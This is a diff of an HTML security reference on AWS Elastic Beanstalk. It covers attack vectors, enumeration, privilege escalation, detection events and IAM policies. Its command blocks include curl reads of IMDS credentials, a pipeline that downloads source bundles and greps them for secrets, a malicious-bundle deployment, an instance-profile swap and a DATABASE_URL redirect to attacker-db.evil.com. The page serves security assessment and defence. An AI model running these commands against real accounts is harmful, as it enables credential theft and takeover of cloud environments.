@@ -263,7 +263,7 @@
         <span class="header-title">AWS Elastic Beanstalk Security</span>
         <span class="header-badge">COMPUTE</span>
       </div>
-      <p class="header-desc">AWS Elastic Beanstalk is a PaaS that orchestrates EC2, Auto Scaling, ELB, S3, CloudWatch, and IAM to deploy applications. It creates a predictable S3 bucket (elasticbeanstalk-region-account-id) containing source bundles, exposes environment variables in plaintext through its API, and runs EC2 instances with IMDS.</p>
+      <p class="header-desc">AWS Elastic Beanstalk is a PaaS that orchestrates EC2, Auto Scaling, ELB, S3, CloudWatch, and IAM to deploy applications. It creates a predictable S3 bucket (<code>elasticbeanstalk-&lt;region&gt;-&lt;account-id&gt;</code>) containing application source bundles, exposes environment variables in plaintext through its API, and runs EC2 instances with IMDS -- making it a compound attack surface.</p>
     </div>
   </div>
 </div>
@@ -283,24 +283,28 @@
           <div class="stat-label">IMDS Exposure</div>
         </div>
         <div class="stat-card">
-          <div class="stat-value" style="color: #c084fc;">Svc + Instance</div>
+          <div class="stat-value" style="color: #c084fc;">Service + Instance Profile</div>
           <div class="stat-label">IAM Roles</div>
         </div></div>
 
 <!-- Overview -->
-<div class="section"><h2><span style="color:#f59e0b;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+<div class="section"><h2><span style="color:#f59e0b;">📋</span> Service Overview</h2><div class="overview-grid">
         <div>
-          <h4 style="color: #f59e0b;">Application Deployment &amp; S3 Storage</h4>
-          <p>Every application version is stored as a ZIP/WAR source bundle in elasticbeanstalk-region-account-id S3 bucket. Source bundles frequently contain hardcoded secrets, database credentials, and API keys.</p>
-          <div class="attack-note"><span style="color:#f59e0b;">Attack note:</span> The S3 bucket name is deterministic -- knowing the region and account ID is enough to construct it. Source bundles often contain .env files with secrets.</div>
-        </div>
-        <div>
-          <h4 style="color: #f59e0b;">Environment Config &amp; Secrets Exposure</h4>
-          <p>Environment properties are stored as option settings and returned in plaintext by DescribeConfigurationSettings. Any principal with this permission can read every environment variable including secrets.</p>
-          <div class="attack-note"><span style="color:#f59e0b;">Attack note:</span> Environment variables are not encrypted at rest. They are visible in plaintext in the console and API responses. Use Secrets Manager references instead.</div>
+          <h4 style="color: #f59e0b;">Application Deployment and S3 Storage</h4>
+          <p>Elastic Beanstalk stores every application version as a ZIP/WAR source bundle in an S3 bucket named <code>elasticbeanstalk-&lt;region&gt;-&lt;account-id&gt;</code>. Anyone with <code>s3:GetObject</code> on that bucket can download the full application source code, which frequently contains hardcoded secrets, database credentials, and API keys.</p>
+          <div class="attack-note"><span style="color:#f59e0b;">Attack note:</span> The S3 bucket name is deterministic -- knowing the region and account ID is enough to construct it. Source bundles often contain <code>.env</code> files, configuration files with database passwords, and API keys.</div>
+        </div><div>
+          <h4 style="color: #f59e0b;">Environment Configuration and Secrets Exposure</h4>
+          <p>Environment properties set via the console or CLI are stored as option settings in the <code>aws:elasticbeanstalk:application:environment</code> namespace. These values are returned in plaintext by the <code>DescribeConfigurationSettings</code> API action. Any principal with <code>elasticbeanstalk:DescribeConfigurationSettings</code> permission can read every environment variable, including secrets stored there.</p>
+          <div class="attack-note"><span style="color:#f59e0b;">Attack note:</span> Environment variables are not encrypted at rest in Elastic Beanstalk. They are visible in plaintext in the AWS Console and in API responses. Use AWS Secrets Manager references instead of raw secrets.</div>
+        </div><div>
+          <h4 style="color: #f59e0b;">IAM Roles: Service Role and Instance Profile</h4>
+          <p>Elastic Beanstalk uses two IAM roles: a <strong>service role</strong> (<code>aws-elasticbeanstalk-service-role</code>) that Elastic Beanstalk assumes to manage AWS resources, and an <strong>instance profile</strong> (<code>aws-elasticbeanstalk-ec2-role</code>) attached to EC2 instances. The instance profile typically has the managed policies <code>AWSElasticBeanstalkWebTier</code>, <code>AWSElasticBeanstalkWorkerTier</code>, and <code>AWSElasticBeanstalkMulticontainerDocker</code> attached.</p>
+          <div class="attack-note"><span style="color:#f59e0b;">Attack note:</span> The <code>AWSElasticBeanstalkWebTier</code> policy grants <code>s3:Get*</code> and <code>s3:List*</code> on buckets starting with <code>elasticbeanstalk-*</code>, plus <code>s3:PutObject</code>. Compromising an instance gives access to all source bundles in the account.</div>
         </div></div></div>
 
 <!-- Risk Assessment -->
+
 <div class="section">
   <h2>Security Risk Assessment</h2>
   <div class="risk-gauge">
@@ -315,44 +319,84 @@
       <div class="risk-score-label">Risk Score</div>
     </div>
   </div>
-  <p class="risk-desc">Elastic Beanstalk combines multiple attack surfaces: deterministic S3 bucket naming exposes source code, plaintext environment variables leak secrets through the API, EC2 instances with IMDS provide credential theft opportunities, and .ebextensions hooks allow code execution as root.</p>
+  <p class="risk-desc">Elastic Beanstalk combines multiple attack surfaces: deterministic S3 bucket naming exposes source code, plaintext environment variables leak secrets through the API, EC2 instances with IMDS provide credential theft opportunities, and <code>.ebextensions</code>/<code>.platform</code> hooks allow code execution as root during deployments.</p>
 </div>
 
 <!-- Main Panels -->
 <div class="panels-grid">
       <div class="panel" style="border-color: #f8717133;">
-        <h3 style="color: #f87171;">&#x2694;&#xFE0F; Attack Vectors</h3><h4 style="color: #f87171;">Source Code and Secrets Theft</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Download source bundles from predictable S3 bucket</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Extract env vars via DescribeConfigurationSettings</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access .env files and config files from source bundles</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Read secrets from S3-stored deployment artifacts</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Enumerate app versions to find older leaked secrets</li></ul><h4 style="color: #f87171;">Instance and Deployment Compromise</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> SSRF to IMDS (169.254.169.254) on deployed app</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Inject malicious code via .ebextensions commands</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Execute scripts via .platform/hooks/ (runs as root)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Abuse container_commands for pre-deployment RCE</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Modify environment to attach over-privileged instance profile</li></ul></div>
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Source Code and Secrets Theft</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Download source bundles from predictable S3 bucket</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Extract environment variables via DescribeConfigurationSettings API</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access <code>.env</code> files and config files from source bundles</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Read application secrets from S3-stored deployment artifacts</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Enumerate application versions to find older bundles with leaked secrets</li></ul><h4 style="color: #f87171;">Instance and Deployment Compromise</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> SSRF on deployed application to reach IMDS (169.254.169.254)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Inject malicious code via <code>.ebextensions</code> commands in source bundle</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Execute arbitrary scripts via <code>.platform/hooks/</code> (runs as root)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Abuse <code>container_commands</code> in <code>.ebextensions</code> for pre-deployment RCE</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Modify environment to attach an over-privileged instance profile</li></ul></div>
       <div class="panel" style="border-color: #fb923c33;">
-        <h3 style="color: #fb923c;">&#x26A0;&#xFE0F; Misconfigurations</h3><h4 style="color: #fb923c;">Secrets and Access</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Hardcoded secrets in environment properties</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Database credentials in .ebextensions option_settings</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> S3 source bucket with overly permissive policy</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Source bundles containing .env files with secrets</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> S3 bucket using default SSE-S3 instead of SSE-KMS</li></ul><h4 style="color: #fb923c;">Infrastructure Security</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> IMDSv1 enabled (default on AL2 and earlier)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Over-privileged instance profile</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Security groups allowing 0.0.0.0/0 inbound</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Managed platform updates disabled</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> VPC flow logs not enabled</li></ul></div>
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Secrets and Access Exposure</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Hardcoded secrets in environment properties (plaintext in API responses)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Database credentials stored in <code>.ebextensions</code> option_settings</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> S3 source bundle bucket with overly permissive access policy</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Application source bundles containing <code>.env</code> files with secrets</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Elastic Beanstalk S3 bucket using default SSE-S3 instead of SSE-KMS with customer-managed key</li></ul><h4 style="color: #fb923c;">Infrastructure Security</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> IMDSv1 enabled on Elastic Beanstalk EC2 instances (default on AL2 and earlier; AL2023 defaults to IMDSv2-only)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Over-privileged instance profile with broad S3 or IAM permissions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Security groups allowing 0.0.0.0/0 inbound on application ports</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Managed platform updates disabled (unpatched OS and runtime)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> VPC flow logs not enabled on Elastic Beanstalk VPC/subnets</li></ul></div>
       <div class="panel" style="border-color: #22d3ee33;">
-        <h3 style="color: #22d3ee;">&#x1F50D; Enumeration</h3><div class="cmd-block">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3><div class="cmd-block">
           <div class="cmd-title">List All Applications</div>
           <pre><code>aws elasticbeanstalk describe-applications</code></pre>
         </div><div class="cmd-block">
           <div class="cmd-title">List All Environments</div>
           <pre><code>aws elasticbeanstalk describe-environments</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">Extract Environment Config (Plaintext Secrets)</div>
+          <div class="cmd-title">Extract Environment Configuration (includes environment variables in plaintext)</div>
           <pre><code>aws elasticbeanstalk describe-configuration-settings \
   --application-name APP_NAME \
   --environment-name ENV_NAME</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">List Application Versions (S3 Locations)</div>
+          <div class="cmd-title">List Application Versions (reveals S3 source bundle locations)</div>
           <pre><code>aws elasticbeanstalk describe-application-versions \
   --application-name APP_NAME</code></pre>
         </div><div class="cmd-block">
           <div class="cmd-title">Download Source Bundle from S3</div>
           <pre><code>aws s3 cp s3://elasticbeanstalk-REGION-ACCOUNT_ID/APP_NAME/SOURCE_BUNDLE.zip .</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Describe Environment Resources (EC2 instances, ASG, ELB, SGs)</div>
+          <pre><code>aws elasticbeanstalk describe-environment-resources \
+  --environment-name ENV_NAME</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Check Environment Health</div>
+          <pre><code>aws elasticbeanstalk describe-environment-health \
+  --environment-name ENV_NAME \
+  --attribute-names All</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Describe Individual Instance Health</div>
+          <pre><code>aws elasticbeanstalk describe-instances-health \
+  --environment-name ENV_NAME</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">List Available Solution Stacks (platform versions)</div>
+          <pre><code>aws elasticbeanstalk list-available-solution-stacks</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Retrieve Environment Logs</div>
+          <pre><code>aws elasticbeanstalk request-environment-info \
+  --environment-name ENV_NAME \
+  --info-type tail
+# Wait, then retrieve:
+aws elasticbeanstalk retrieve-environment-info \
+  --environment-name ENV_NAME \
+  --info-type tail</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">List Tags on an Environment</div>
+          <pre><code>aws elasticbeanstalk list-tags-for-resource \
+  --resource-arn arn:aws:elasticbeanstalk:REGION:ACCOUNT_ID:environment/APP_NAME/ENV_NAME</code></pre>
         </div></div>
       <div class="panel" style="border-color: #c084fc33;">
-        <h3 style="color: #c084fc;">&#x1F4C8; Privilege Escalation</h3><h4 style="color: #c084fc;">Via Source Bundle Injection</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> CreateApplicationVersion + UpdateEnvironment for RCE</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> .ebextensions commands run as root on deployment</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> .platform/hooks/ scripts run as root</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Reverse shell installation via deployment hooks</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Instance profile credential exfiltration</li></ul><h4 style="color: #c084fc;">Via Environment Manipulation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Modify DATABASE_URL to attacker-controlled server</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Inject reverse shell via consumed env variable</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Change instance profile to more privileged role</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Access elevated IMDS credentials via iam:PassRole</li></ul><div class="note"><strong>Key insight:</strong> Elastic Beanstalk exposes secrets through three channels: IMDS on instances, environment variables via the API, and source bundles in S3. All three must be secured independently.</div></div>
-      <div class="panel" style="border-color: #facc1533;">
-        <h3 style="color: #facc15;">&#x1F517; Persistence</h3><h4 style="color: #facc15;">Code-Level</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Deploy malicious source bundle with backdoor</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> .ebextensions for persistent root-level access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> .platform/hooks for deployment-time execution</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify S3 source bundles for future deployments</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Inject malicious environment variables</li></ul><h4 style="color: #facc15;">Infrastructure-Level</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Maintain IMDS credential access from instances</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Store exfiltrated credentials for out-of-band access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify security groups for persistent network access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Swap instance profile to maintain elevated access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create additional app versions as backup access</li></ul></div>
+        <h3 style="color: #c084fc;">📈 Privilege Escalation</h3><h4 style="color: #c084fc;">Via Source Bundle Injection</h4><p>An attacker with <code>elasticbeanstalk:CreateApplicationVersion</code> and <code>elasticbeanstalk:UpdateEnvironment</code> can upload a malicious source bundle containing <code>.ebextensions</code> config files or <code>.platform/hooks/</code> scripts. These execute as root on deployment:</p><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> <code>.ebextensions/*.config</code> files support <code>commands</code> and <code>container_commands</code> keys that run shell commands as root</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> <code>.platform/hooks/predeploy/</code> and <code>.platform/hooks/postdeploy/</code> scripts run as root during deployment</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> An attacker can use these to install a reverse shell, exfiltrate credentials, or modify the instance profile</li></ul><h4 style="color: #c084fc;">Via Environment Variable Manipulation</h4><p>An attacker with <code>elasticbeanstalk:UpdateEnvironment</code> can modify environment properties to inject malicious values (e.g., change a <code>DATABASE_URL</code> to point to an attacker-controlled server, or inject a reverse shell command into a variable consumed by the application).</p><h4 style="color: #c084fc;">Via Instance Profile Swap</h4><p>An attacker with <code>elasticbeanstalk:UpdateEnvironment</code> and <code>iam:PassRole</code> can change the instance profile to a more privileged role, then access those elevated credentials from the EC2 instance via IMDS.</p></div>
+      <div class="panel" style="border-color: #f59e0b33;">
+        <h3 style="color: #f59e0b;">🔑 Credential Theft</h3><h4 style="color: #f59e0b;">From IMDS (on compromised instance)</h4><pre><code># Get instance profile role name
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Retrieve temporary credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME</code></pre><h4 style="color: #f59e0b;">From Environment Variables</h4><pre><code># From outside (with EB read permissions)
+aws elasticbeanstalk describe-configuration-settings \
+  --application-name APP_NAME \
+  --environment-name ENV_NAME \
+  --query 'ConfigurationSettings[0].OptionSettings[?Namespace==`aws:elasticbeanstalk:application:environment`]'</code></pre><h4 style="color: #f59e0b;">From Source Bundles</h4><pre><code># Download and extract source bundle, then search for secrets
+aws s3 cp s3://elasticbeanstalk-REGION-ACCOUNT_ID/path/to/bundle.zip /tmp/
+unzip /tmp/bundle.zip -d /tmp/source
+grep -ri &quot;password\|secret\|key\|token&quot; /tmp/source/</code></pre><div class="note"><strong>Key insight:</strong> Elastic Beanstalk exposes secrets through three distinct channels: IMDS on instances, environment variables via the API, and source bundles in S3. All three must be secured independently.</div></div>
       <div class="panel" style="border-color: #4ade8033;">
-        <h3 style="color: #4ade80;">&#x1F6E1;&#xFE0F; Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateApplicationVersion - new source bundle uploaded</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateEnvironment - environment config changed</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DescribeConfigurationSettings - secrets read</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> SwapEnvironmentCNAMEs - DNS swap between envs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> RebuildEnvironment - environment rebuilt</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DescribeConfigurationSettings from unusual principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> S3 GetObject on elasticbeanstalk-* from unknown IPs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateEnvironment changing instance profile</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateApplicationVersion from unexpected S3 location</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Multiple DescribeApplicationVersions calls (recon)</li></ul></div></div>
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateApplication -- new application created</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateEnvironment -- new environment launched</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateEnvironment -- environment configuration changed</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateApplicationVersion -- new source bundle uploaded</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DescribeConfigurationSettings -- environment variables read</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateConfigurationTemplate -- configuration template modified</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> RebuildEnvironment -- environment rebuilt</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> SwapEnvironmentCNAMEs -- DNS swap between environments</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DescribeConfigurationSettings calls from unusual principals or IPs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Multiple DescribeApplicationVersions followed by S3 GetObject on source bundles</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateEnvironment calls changing instance profile or security groups</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateApplicationVersion with source bundle from unexpected S3 location</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> S3 GetObject requests on <code>elasticbeanstalk-*</code> buckets from unknown IPs</li></ul></div></div>
 
 <!-- Exploitation -->
-<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid"><div class="cmd-block">
+<div class="section"><h2><span style="color:#f87171;">💻</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
           <div class="cmd-title">Extract All Environment Variables</div>
           <pre><code>aws elasticbeanstalk describe-configuration-settings \
   --application-name APP_NAME \
@@ -361,121 +405,197 @@
   --output table</code></pre>
         </div><div class="cmd-block">
           <div class="cmd-title">Deploy Malicious Source Bundle</div>
-          <pre><code>aws elasticbeanstalk create-application-version \
+          <pre><code># Upload malicious bundle to S3
+aws s3 cp malicious-app.zip s3://elasticbeanstalk-REGION-ACCOUNT_ID/deploy.zip
+# Create new application version pointing to it
+aws elasticbeanstalk create-application-version \
   --application-name APP_NAME \
   --version-label malicious-v1 \
-  --source-bundle S3Bucket=elasticbeanstalk-REGION-ACCOUNT,S3Key=deploy.zip</code></pre>
+  --source-bundle S3Bucket=elasticbeanstalk-REGION-ACCOUNT_ID,S3Key=deploy.zip
+# Deploy it
+aws elasticbeanstalk update-environment \
+  --environment-name ENV_NAME \
+  --version-label malicious-v1</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">Swap Instance Profile</div>
+          <div class="cmd-title">Swap Instance Profile to Escalate Privileges</div>
           <pre><code>aws elasticbeanstalk update-environment \
   --environment-name ENV_NAME \
-  --option-settings Namespace=aws:autoscaling:launchconfiguration,OptionName=IamInstanceProfile,Value=PRIVILEGED_PROFILE</code></pre>
+  --option-settings \
+    Namespace=aws:autoscaling:launchconfiguration,OptionName=IamInstanceProfile,Value=PRIVILEGED_INSTANCE_PROFILE</code></pre>
         </div><div class="cmd-block">
           <div class="cmd-title">Inject Environment Variable</div>
           <pre><code>aws elasticbeanstalk update-environment \
   --environment-name ENV_NAME \
-  --option-settings Namespace=aws:elasticbeanstalk:application:environment,OptionName=DATABASE_URL,Value=attacker-db.evil.com</code></pre>
+  --option-settings \
+    Namespace=aws:elasticbeanstalk:application:environment,OptionName=DATABASE_URL,Value=attacker-db.evil.com</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Retrieve and Download Logs</div>
+          <pre><code>aws elasticbeanstalk request-environment-info \
+  --environment-name ENV_NAME --info-type bundle
+# Wait for log retrieval, then:
+aws elasticbeanstalk retrieve-environment-info \
+  --environment-name ENV_NAME --info-type bundle</code></pre>
         </div></div></div>
 
 <!-- Policies -->
-<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid"><div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+<div class="section"><h2><span style="color:#4ade80;">📜</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
           <div class="policy-header">
             <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
-            <span style="color: #f87171; font-weight: 600;">Dangerous - Full Elastic Beanstalk Access</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous -- Full Elastic Beanstalk Access</span>
           </div>
           <pre><code>{
-  &quot;Effect&quot;: &quot;Allow&quot;,
-  &quot;Action&quot;: &quot;elasticbeanstalk:*&quot;,
-  &quot;Resource&quot;: &quot;*&quot;
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;elasticbeanstalk:*&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
 }</code></pre>
-          <p class="policy-desc">Full control -- can read secrets, deploy malicious code, and change instance profiles</p>
-        </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
-          <div class="policy-header">
-            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
-            <span style="color: #4ade80; font-weight: 600;">Secure - Read-Only (No Config Access)</span>
-          </div>
-          <pre><code>{
-  &quot;Effect&quot;: &quot;Allow&quot;,
-  &quot;Action&quot;: [
-    &quot;elasticbeanstalk:DescribeApplications&quot;,
-    &quot;elasticbeanstalk:DescribeEnvironments&quot;,
-    &quot;elasticbeanstalk:DescribeEnvironmentHealth&quot;
-  ],
-  &quot;Resource&quot;: &quot;*&quot;
-}</code></pre>
-          <p class="policy-desc">Environment monitoring without exposing configuration secrets</p>
+          <p class="policy-desc">Allows full control over all Elastic Beanstalk resources -- can read secrets, deploy malicious code, and change instance profiles</p>
         </div><div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
           <div class="policy-header">
             <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
-            <span style="color: #f87171; font-weight: 600;">Dangerous - Env Variable Read Access</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous -- Environment Variable Read Access</span>
           </div>
           <pre><code>{
-  &quot;Effect&quot;: &quot;Allow&quot;,
-  &quot;Action&quot;: &quot;elasticbeanstalk:DescribeConfigurationSettings&quot;,
-  &quot;Resource&quot;: &quot;*&quot;
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;elasticbeanstalk:DescribeConfigurationSettings&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
 }</code></pre>
-          <p class="policy-desc">Allows reading all environment variables (including plaintext secrets) from any environment</p>
+          <p class="policy-desc">Allows reading all environment variables (including secrets stored in plaintext) from any environment</p>
+        </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure -- Read-Only with No Configuration Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [
+    {
+      &quot;Effect&quot;: &quot;Allow&quot;,
+      &quot;Action&quot;: [
+        &quot;elasticbeanstalk:DescribeApplications&quot;,
+        &quot;elasticbeanstalk:DescribeEnvironments&quot;,
+        &quot;elasticbeanstalk:DescribeEvents&quot;,
+        &quot;elasticbeanstalk:DescribeEnvironmentHealth&quot;,
+        &quot;elasticbeanstalk:DescribeInstancesHealth&quot;,
+        &quot;elasticbeanstalk:ListTagsForResource&quot;
+      ],
+      &quot;Resource&quot;: &quot;*&quot;
+    },
+    {
+      &quot;Effect&quot;: &quot;Deny&quot;,
+      &quot;Action&quot;: [
+        &quot;elasticbeanstalk:DescribeConfigurationSettings&quot;,
+        &quot;elasticbeanstalk:DescribeConfigurationOptions&quot;
+      ],
+      &quot;Resource&quot;: &quot;*&quot;
+    }
+  ]
+}</code></pre>
+          <p class="policy-desc">Allows environment monitoring without exposing configuration secrets</p>
+        </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure -- Scoped Deployment Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;elasticbeanstalk:CreateApplicationVersion&quot;,
+      &quot;elasticbeanstalk:UpdateEnvironment&quot;,
+      &quot;elasticbeanstalk:DescribeEnvironments&quot;,
+      &quot;elasticbeanstalk:DescribeEvents&quot;
+    ],
+    &quot;Resource&quot;: [
+      &quot;arn:aws:elasticbeanstalk:REGION:ACCOUNT_ID:application/APP_NAME&quot;,
+      &quot;arn:aws:elasticbeanstalk:REGION:ACCOUNT_ID:environment/APP_NAME/ENV_NAME&quot;,
+      &quot;arn:aws:elasticbeanstalk:REGION:ACCOUNT_ID:applicationversion/APP_NAME/*&quot;
+    ]
+  }]
+}</code></pre>
+          <p class="policy-desc">Scoped to a specific application and environment -- limits blast radius</p>
         </div></div></div>
 
 <!-- Defenses -->
-<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid"><div class="defense-card">
+<div class="section"><h2><span style="color:#4ade80;">🛡️</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F510;</span>
+            <span class="defense-icon"></span>
             <div>
-              <h4>Use Secrets Manager Instead of Env Properties</h4>
-              <p>Never store raw secrets in Elastic Beanstalk environment properties. Use Secrets Manager references.</p>
-              <pre><code>aws elasticbeanstalk update-environment --environment-name ENV \
-  --option-settings Namespace=aws:elasticbeanstalk:application:environmentsecrets,OptionName=DB_PASSWORD,Value=arn:aws:secretsmanager:REGION:ACCT:secret:my-pass</code></pre>
+              <h4>Use Secrets Manager Instead of Environment Properties</h4>
+              <p>Never store raw secrets in Elastic Beanstalk environment properties. Use the <code>aws:elasticbeanstalk:application:environmentsecrets</code> namespace to reference AWS Secrets Manager secrets or SSM Parameter Store SecureString parameters.</p>
+              <pre><code>aws elasticbeanstalk update-environment \
+  --environment-name ENV_NAME \
+  --option-settings \
